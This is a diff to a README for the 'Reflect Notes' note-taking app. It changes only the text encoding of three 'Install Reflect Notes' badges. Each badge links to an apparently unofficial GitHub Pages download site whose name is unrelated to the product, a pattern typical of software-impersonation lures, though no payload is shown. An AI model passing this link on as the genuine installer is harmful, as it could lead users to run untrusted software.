@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Reflect Notes](https://img.shields.io/badge/⬇_Install_Reflect%20Notes-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reflect Notes](https://img.shields.io/badge/⬇_Install_Reflect+Notes-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Reflect Notes is a networked note-taking app with automatic backlinking, daily n
 
 <div align="center">
 
-[![⬇ Install Reflect Notes](https://img.shields.io/badge/⬇_Install_Reflect%20Notes-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reflect Notes](https://img.shields.io/badge/⬇_Install_Reflect+Notes-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Reflect Notes is a networked note-taking app with automatic backlinking, daily n
 
 <div align="center">
 
-[![⬇ Install Reflect Notes](https://img.shields.io/badge/⬇_Install_Reflect%20Notes-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reflect Notes](https://img.shields.io/badge/⬇_Install_Reflect+Notes-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
